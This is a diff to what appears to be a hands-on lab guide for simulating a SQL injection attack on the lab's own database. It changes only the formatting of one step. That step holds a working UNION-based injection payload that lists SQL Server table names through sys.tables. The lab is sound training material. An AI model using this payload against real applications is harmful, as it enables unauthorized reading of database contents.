@@ -185,7 +185,8 @@ In this task, We'll try to simulate a SQL Injection attack on our database and s
 3.	In the **Search Box**, put the following code and  click on **Search**. You can also copy this from the web page by clicking on **SQLi Hints** and copying 3rd command.
 ```
     
-   ' UNION SELECT '0', '1', '2', STUFF((select name from sys.tables FOR XML PATH('')),1,1,''), '4', '5', '6', '7', '8', '2010-10-10' --
+' UNION SELECT '0', '1', '2', STUFF((select name from sys.tables FOR XML PATH('')),1,1,''), '4', '5', '6', '7', '8', '2010-10-10' --
+
 ```
 ![](images/searchbox.png)
 
